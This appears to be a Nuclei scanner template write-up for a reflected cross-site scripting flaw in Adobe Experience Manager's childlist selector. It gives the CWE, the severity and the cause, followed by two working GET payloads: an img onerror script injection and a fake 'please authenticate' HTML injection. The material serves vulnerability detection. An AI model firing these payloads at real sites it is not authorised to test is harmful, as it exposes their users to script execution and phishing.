# Nuclei Template: Adobe Experience Manager Childlist Selector - Cross-Site Scripting
**Template ID:** aem-xss-childlist
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`aem-childrenlist-xss.yaml`)

## Vulnerability Information & PoC

## Description
Adobe Experience Manager contains a cross-site scripting vulnerability via requests using the childlist selector when a dispatcher does not respect the content type responded by AEM and flips from application/json to text/html. As a consequence, the reflected suffix is executed and interpreted in the browser.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/{{rand_base(4)}}<img src=x data'a'onerror=alert(domain)>.childrenlist.html
GET {{BaseURL}}/{{rand_base(4)}}<br><br>please%20authenticate<br><br>.childrenlist.html
```

